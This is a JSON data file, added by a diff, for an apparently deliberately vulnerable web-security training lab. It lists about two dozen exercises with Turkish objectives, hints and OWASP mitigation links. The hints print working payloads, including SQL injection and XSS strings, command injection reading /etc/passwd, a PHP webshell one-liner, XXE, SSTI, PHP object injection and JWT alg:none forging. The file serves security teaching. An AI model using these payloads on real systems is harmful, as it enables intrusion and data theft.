@@ -1,0 +1,370 @@
+[
+  {
+    "id": "sqli",
+    "name": "SQL Injection (UNION + Blind)",
+    "category": "A05:2025 Injection",
+    "cwe": "CWE-89",
+    "difficulty": 2,
+    "path": "vulnerabilities/sqli/",
+    "dangerZone": false,
+    "objective": "User ID kutusunu kullanarak users tablosundan diğer kullanıcıların parola md5 hash'lerini çıkar.",
+    "hints": [
+      "Girdi sorguya doğrudan ekleniyor olabilir. Tek tırnak ' dene.",
+      "UNION SELECT ile başka kolonlar çekebilirsin: ' UNION SELECT user,password FROM users-- -",
+      "Kör (blind) için ' AND SLEEP(5)-- - ile zaman farkını gözle."
+    ],
+    "mitigationUrl": "https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html"
+  },
+  {
+    "id": "xss_reflected",
+    "name": "XSS (Reflected)",
+    "category": "A05:2025 Injection",
+    "cwe": "CWE-79",
+    "difficulty": 1,
+    "path": "vulnerabilities/xss_reflected/",
+    "dangerZone": false,
+    "objective": "İsim kutusuna bir JavaScript payload'u yansıtarak alert(document.domain) çalıştır.",
+    "hints": [
+      "Girdi cevapta encode edilmeden yansıyor mu?",
+      "<script>alert(document.domain)</script> dene.",
+      "Filtre varsa <img src=x onerror=alert(document.domain)> gibi alternatifleri dene."
+    ],
+    "mitigationUrl": "https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html"
+  },
+  {
+    "id": "xss_stored",
+    "name": "XSS (Stored)",
+    "category": "A05:2025 Injection",
+    "cwe": "CWE-79",
+    "difficulty": 2,
+    "path": "vulnerabilities/xss_stored/",
+    "dangerZone": false,
+    "objective": "Ziyaretçi defterine kalıcı bir XSS payload'u yerleştir; her ziyaretçide çalışsın.",
+    "hints": [
+      "Yorum alanı kaydedildikten sonra encode ediliyor mu?",
+      "<script>alert(1)</script> yorumunu kaydet ve sayfayı yenile.",
+      "Filtre varsa olay-handler (onerror/onload) tabanlı payload dene."
+    ],
+    "mitigationUrl": "https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html"
+  },
+  {
+    "id": "command_injection",
+    "name": "Command Injection",
+    "category": "A05:2025 Injection",
+    "cwe": "CWE-78",
+    "difficulty": 3,
+    "path": "vulnerabilities/command_injection/",
+    "dangerZone": true,
+    "objective": "Ping aracını kullanarak sunucuda ek bir komut çalıştır (ör. /etc/passwd oku).",
+    "hints": [
+      "Girdi shell'e doğrudan veriliyor olabilir.",
+      "127.0.0.1; cat /etc/passwd dene.",
+      "; engelliyse | , %0a , $(...) , backtick alternatiflerini dene."
+    ],
+    "mitigationUrl": "https://cheatsheetseries.owasp.org/cheatsheets/OS_Command_Injection_Defense_Cheat_Sheet.html"
+  },
+  {
+    "id": "lfi",
+    "name": "Local/Remote File Inclusion",
+    "category": "A05:2025 Injection",
+    "cwe": "CWE-98",
+    "difficulty": 3,
+    "path": "vulnerabilities/lfi/",
+    "dangerZone": true,
+    "objective": "page parametresiyle sunucudaki keyfi bir dosyayı (ör. /etc/passwd) dahil et/oku.",
+    "hints": [
+      "page= parametresi include()'a gidiyor olabilir.",
+      "?page=../../../../etc/passwd dene.",
+      "php://filter/convert.base64-encode/resource=... ile kaynak kod oku."
+    ],
+    "mitigationUrl": "https://cheatsheetseries.owasp.org/cheatsheets/File_Inclusion_Prevention_Cheat_Sheet.html"
+  },
+  {
+    "id": "file_upload",
+    "name": "Unrestricted File Upload",
+    "category": "A05:2025 / A04 Insecure Design",
+    "cwe": "CWE-434",
+    "difficulty": 3,
+    "path": "vulnerabilities/file_upload/",
+    "dangerZone": true,
+    "objective": "Çalıştırılabilir bir PHP webshell yükle ve tarayıcıdan çalıştır.",
+    "hints": [
+      "Yüklenen dosyanın uzantısı/MIME'i kontrol ediliyor mu?",
+      "shell.php (<?php system($_GET['c']); ?>) yükle, sonra uploads/ altından çağır.",
+      "Uzantı engelliyse .phtml, çift uzantı (shell.jpg.php) veya magic-byte polyglot dene."
+    ],
+    "mitigationUrl": "https://cheatsheetseries.owasp.org/cheatsheets/File_Upload_Cheat_Sheet.html"
+  },
+  {
+    "id": "idor",
+    "name": "IDOR / Broken Access Control",
+    "category": "A01:2025 Broken Access Control",
+    "cwe": "CWE-639",
+    "difficulty": 2,
+    "path": "vulnerabilities/idor/",
+    "dangerZone": false,
+    "objective": "id parametresini değiştirerek sana ait olmayan siparişin gizli notunu (admin flag'i) oku.",
+    "hints": [
+      "URL'deki ?id= değerini değiştirmeyi dene.",
+      "Sahiplik kontrolü var mı? id=1 admin'in siparişi.",
+      "Yüksek seviyede id base64/hash ile gizlenmiş olabilir."
+    ],
+    "mitigationUrl": "https://cheatsheetseries.owasp.org/cheatsheets/Access_Control_Cheat_Sheet.html"
+  },
+  {
+    "id": "csrf",
+    "name": "Cross-Site Request Forgery",
+    "category": "A01:2025 Broken Access Control",
+    "cwe": "CWE-352",
+    "difficulty": 2,
+    "path": "vulnerabilities/csrf/",
+    "dangerZone": false,
+    "objective": "Kurbanın parolasını, onun bilgisi olmadan (token olmadan) değiştiren bir istek kurgula.",
+    "hints": [
+      "Parola değiştirme isteği anti-CSRF token istiyor mu?",
+      "GET ile çalışıyorsa <img src=...> ile tetiklenebilir.",
+      "Impossible seviyede per-request token + hash_equals var."
+    ],
+    "mitigationUrl": "https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html"
+  },
+  {
+    "id": "deserialization",
+    "name": "Insecure Deserialization (PHP Object Injection)",
+    "category": "A08:2025 Software or Data Integrity Failures",
+    "cwe": "CWE-502",
+    "difficulty": 4,
+    "path": "vulnerabilities/deserialization/",
+    "dangerZone": true,
+    "objective": "Serialize edilmiş bir Pwn nesnesi göndererek __wakeup() üzerinden sunucuda komut çalıştır.",
+    "hints": [
+      "data alanı unserialize() ediliyor.",
+      "Pwn sınıfının __wakeup'ı $cmd'yi shell'e veriyor.",
+      "O:3:\"Pwn\":2:{s:3:\"cmd\";s:2:\"id\";s:6:\"result\";s:0:\"\";} dene."
+    ],
+    "mitigationUrl": "https://cheatsheetseries.owasp.org/cheatsheets/Deserialization_Cheat_Sheet.html"
+  },
+  {
+    "id": "xxe",
+    "name": "XML External Entity (XXE)",
+    "category": "A08:2025 Software or Data Integrity Failures",
+    "cwe": "CWE-611",
+    "difficulty": 3,
+    "path": "vulnerabilities/xxe/",
+    "dangerZone": true,
+    "objective": "XML dış entity tanımlayarak sunucudan /etc/passwd dosyasını oku.",
+    "hints": [
+      "Parser dış entity'leri çözüyor olabilir.",
+      "<!DOCTYPE r [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]> ve <r>&xxe;</r> dene.",
+      "Filtre varsa PUBLIC identifier veya şemasız yol dene."
+    ],
+    "mitigationUrl": "https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html"
+  },
+  {
+    "id": "ssrf",
+    "name": "Server-Side Request Forgery (SSRF)",
+    "category": "A01:2025 Broken Access Control",
+    "cwe": "CWE-918",
+    "difficulty": 4,
+    "path": "vulnerabilities/ssrf/",
+    "dangerZone": true,
+    "objective": "Sunucuyu, dışarıdan erişilemeyen bir iç servise (adminer) ya da file:// ile yerel dosyaya yönlendir.",
+    "hints": [
+      "URL sunucu tarafından getiriliyor.",
+      "file:///etc/passwd ya da http://adminer:8080 dene.",
+      "Loopback bloklanıyorsa iç DNS adı (adminer) veya farklı şema kullan."
+    ],
+    "mitigationUrl": "https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html"
+  },
+  {
+    "id": "open_redirect",
+    "name": "Open Redirect",
+    "category": "A01:2025 Broken Access Control",
+    "cwe": "CWE-601",
+    "difficulty": 1,
+    "path": "vulnerabilities/open_redirect/",
+    "dangerZone": false,
+    "objective": "next parametresini kullanarak kullanıcıyı harici bir siteye yönlendiren bir URL üret.",
+    "hints": [
+      "?next= değeri doğrulanıyor mu?",
+      "?next=https://evil.example.com dene.",
+      "Filtre varsa //evil.example.com veya /\\evil.example.com dene."
+    ],
+    "mitigationUrl": "https://cheatsheetseries.owasp.org/cheatsheets/Unvalidated_Redirects_and_Forwards_Cheat_Sheet.html"
+  },
+  {
+    "id": "weak_crypto",
+    "name": "Weak Crypto / Sensitive Data",
+    "category": "A04:2025 Cryptographic Failures",
+    "cwe": "CWE-327",
+    "difficulty": 3,
+    "path": "vulnerabilities/weak_crypto/",
+    "dangerZone": false,
+    "objective": "Zayıf korunan yetki token'ını forge ederek rolünü 'root' yap.",
+    "hints": [
+      "Token gerçekten şifreli mi yoksa sadece kodlanmış mı?",
+      "base64(\"root\") = cm9vdA==",
+      "İmza varsa: anahtarsız checksum'ı kendin hesapla; hardcoded anahtarı kaynaktan oku."
+    ],
+    "mitigationUrl": "https://cheatsheetseries.owasp.org/cheatsheets/Cryptographic_Storage_Cheat_Sheet.html"
+  },
+  {
+    "id": "auth_brute",
+    "name": "Authentication / Brute-Force",
+    "category": "A07:2025 Authentication Failures",
+    "cwe": "CWE-307",
+    "difficulty": 2,
+    "path": "vulnerabilities/auth_brute/",
+    "dangerZone": false,
+    "objective": "Rate-limit olmayan giriş formundan admin DIŞINDA bir hesaba (ör. gordonb) gir.",
+    "hints": [
+      "Lockout/rate-limit var mı? Kullanıcı var/yok mesajları farklı mı (enumeration)?",
+      "Zayıf md5 parolalar: gordonb/abc123, 1337/charley, pablo/letmein.",
+      "SQLi lab'ından hash'leri çekip crack edebilirsin."
+    ],
+    "mitigationUrl": "https://cheatsheetseries.owasp.org/cheatsheets/Authentication_Cheat_Sheet.html"
+  },
+  {
+    "id": "session_fixation",
+    "name": "Session Fixation",
+    "category": "A07:2025 Authentication Failures",
+    "cwe": "CWE-384",
+    "difficulty": 3,
+    "path": "vulnerabilities/session_fixation/",
+    "dangerZone": false,
+    "objective": "Saldırgan-sabitli bir oturum kimliği ver (?sid=...) ve girişten sonra hâlâ geçerli olduğunu göster.",
+    "hints": [
+      "Oturum kimliği URL'den kabul ediliyor mu?",
+      "Önce ?sid=ATTACKER_FIXED_42, sonra giriş yap.",
+      "Girişte session_regenerate_id çağrılıyor mu? (asıl mesele bu)"
+    ],
+    "mitigationUrl": "https://cheatsheetseries.owasp.org/cheatsheets/Session_Management_Cheat_Sheet.html"
+  },
+  {
+    "id": "misconfig",
+    "name": "Security Misconfiguration",
+    "category": "A02:2025 Security Misconfiguration",
+    "cwe": "CWE-16",
+    "difficulty": 1,
+    "path": "vulnerabilities/misconfig/",
+    "dangerZone": false,
+    "objective": "Açık debug paneli / verbose hata yönetimi üzerinden gizli yapılandırmayı (DB kimlikleri) sızdır.",
+    "hints": [
+      "?debug parametresi var mı?",
+      "Gizliyse zayıf bir anahtar (?debug=secret) dene.",
+      "Yoksa geçersiz girdiyle verbose hata/stack trace tetikle."
+    ],
+    "mitigationUrl": "https://cheatsheetseries.owasp.org/cheatsheets/Error_Handling_Cheat_Sheet.html"
+  },
+  {
+    "id": "ssti",
+    "name": "Server-Side Template Injection",
+    "category": "A05:2025 Injection",
+    "cwe": "CWE-1336",
+    "difficulty": 4,
+    "path": "vulnerabilities/ssti/",
+    "dangerZone": true,
+    "objective": "Şablon ifadesi enjekte ederek sunucuda kod/komut çalıştır ({{7*7}} ile başla).",
+    "hints": [
+      "{{7*7}} 49 dönüyorsa ifade eval ediliyordur.",
+      "{{shell_exec('id')}} ya da {{`id`}} dene.",
+      "Filtre varsa {{file_get_contents('/etc/passwd')}} dene."
+    ],
+    "mitigationUrl": "https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Template_Injection_Prevention_Cheat_Sheet.html"
+  },
+  {
+    "id": "business_logic",
+    "name": "Business Logic / Insecure Design",
+    "category": "A06:2025 Insecure Design",
+    "cwe": "CWE-840",
+    "difficulty": 2,
+    "path": "vulnerabilities/business_logic/",
+    "dangerZone": false,
+    "objective": "Satın alma akışındaki mantık hatasını kullanarak bakiyeni başlangıçtan (100) yukarı çıkar.",
+    "hints": [
+      "Miktar negatif olabilir mi? Fiyat istemciden mi geliyor?",
+      "Negatif miktar → negatif tutar → bakiye artar.",
+      "Kupon birden çok kez uygulanabiliyor mu (stacking)?"
+    ],
+    "mitigationUrl": "https://cheatsheetseries.owasp.org/cheatsheets/Business_Logic_Security_Cheat_Sheet.html"
+  },
+  {
+    "id": "fail_open",
+    "name": "Mishandling Exceptional Conditions (Fail-Open)",
+    "category": "A10:2025 Mishandling of Exceptional Conditions",
+    "cwe": "CWE-636",
+    "difficulty": 3,
+    "path": "vulnerabilities/fail_open/",
+    "dangerZone": false,
+    "objective": "Yetki kontrolünün hata/istisna durumunda 'açık' (fail-open) davranışını kullanarak yönetici alanına gir.",
+    "hints": [
+      "Geçersiz bir token gönderince ne oluyor (istisna)?",
+      "?perm=GARBAGE ile istisna tetikle.",
+      "Boş token ya da tanınmayan rol kabul ediliyor mu?"
+    ],
+    "mitigationUrl": "https://cheatsheetseries.owasp.org/cheatsheets/Error_Handling_Cheat_Sheet.html"
+  },
+  {
+    "id": "jwt",
+    "name": "JWT Attacks (alg:none / weak secret)",
+    "category": "A07:2025 Authentication Failures",
+    "cwe": "CWE-347",
+    "difficulty": 3,
+    "path": "vulnerabilities/jwt/",
+    "dangerZone": false,
+    "objective": "JWT'yi forge ederek rolünü 'root' yap (imza doğrulamasını/alg'i sömür).",
+    "hints": [
+      "İmza doğrulanıyor mu? alg:none kabul ediliyor mu?",
+      "Zayıf secret ('secret') ile HS256 imzala.",
+      "Güçlü secret varsa header'da alg:none dene."
+    ],
+    "mitigationUrl": "https://cheatsheetseries.owasp.org/cheatsheets/JSON_Web_Token_for_Java_Cheat_Sheet.html"
+  },
+  {
+    "id": "supply_chain",
+    "name": "Software Supply Chain (Backdoored Dependency)",
+    "category": "A03:2025 Software Supply Chain Failures",
+    "cwe": "CWE-1357",
+    "difficulty": 4,
+    "path": "vulnerabilities/supply_chain/",
+    "dangerZone": true,
+    "objective": "Backdoor'lanmış üçüncü taraf kütüphane (QuickLog 2.1.3) üzerinden sunucuda kod çalıştır.",
+    "hints": [
+      "Zafiyet senin kodunda değil, bağımlılıkta. Manifest'teki sürüme/CVE'ye bak.",
+      "Kütüphanede gizli bir tetikleyici var: __qlog_exec__:",
+      "msg = __qlog_exec__:system('id'); dene."
+    ],
+    "mitigationUrl": "https://cheatsheetseries.owasp.org/cheatsheets/Vulnerable_Dependency_Management_Cheat_Sheet.html"
+  },
+  {
+    "id": "logging",
+    "name": "Security Logging Failures (Log Injection)",
+    "category": "A09:2025 Security Logging & Alerting Failures",
+    "cwe": "CWE-117",
+    "difficulty": 2,
+    "path": "vulnerabilities/logging/",
+    "dangerZone": false,
+    "objective": "Log'a satır-sonu enjekte ederek sahte bir 'SUCCESS' admin giriş kaydı uydur (veya log görüntüleyiciye XSS).",
+    "hints": [
+      "Kullanıcı adı log satırına nasıl yazılıyor?",
+      "?user=eve%0a00:00:00 SUCCESS login user=admin dene.",
+      "\\n filtreliyse \\r (%0d) dene; high'da log görüntüleyici encode etmiyor."
+    ],
+    "mitigationUrl": "https://cheatsheetseries.owasp.org/cheatsheets/Logging_Cheat_Sheet.html"
+  },
+  {
+    "id": "api",
+    "name": "API Mass Assignment (REST)",
+    "category": "A01:2025 Broken Access Control (API)",
+    "cwe": "CWE-915",
+    "difficulty": 3,
+    "path": "vulnerabilities/api/",
+    "dangerZone": false,
+    "objective": "Profil güncelleme API'sine fazladan alan göndererek (role/is_admin) yetki yükselt.",
+    "hints": [
+      "POST ?api=profile gönderdiğin tüm alanları bağlıyor olabilir.",
+      "role=admin ya da is_admin=1 ekle.",
+      "Filtre varsa is_admin=1 veya role=superadmin dene."
+    ],
+    "mitigationUrl": "https://cheatsheetseries.owasp.org/cheatsheets/Mass_Assignment_Cheat_Sheet.html"
+  }
+]
